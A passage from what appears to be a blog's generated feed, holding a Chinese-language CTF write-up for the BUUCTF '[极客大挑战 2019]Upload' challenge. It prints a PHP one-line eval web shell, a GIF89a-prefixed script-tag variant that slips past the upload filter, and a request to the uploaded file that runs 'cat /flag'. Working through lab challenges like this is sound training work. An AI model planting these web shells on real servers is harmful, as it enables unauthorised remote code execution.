print(result)</span><br><span class="line">			num=<span class="number">1</span></span><br><span class="line">			<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><p>可以上传phtml文件，那么做一个phtml文件，将内容编为一句话木马上传：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">@<span class="keyword">eval</span>($_POST[cmd]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>php被过滤，使用JS脚本绕过：</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=<span class="string">"php"</span>&gt;<span class="built_in">eval</span>($_POST[<span class="string">'cmd'</span>]);&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+<p>猜测文件上传目录是upload，蚁剑连接：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;upload&#x2F;a.phtml?a&#x3D;system(%27cat%20&#x2F;flag%27);</span><br></pre></td></tr></table></figure>]]></content>
       <categories>
         <category>BUUCTF</category>
       </categories>
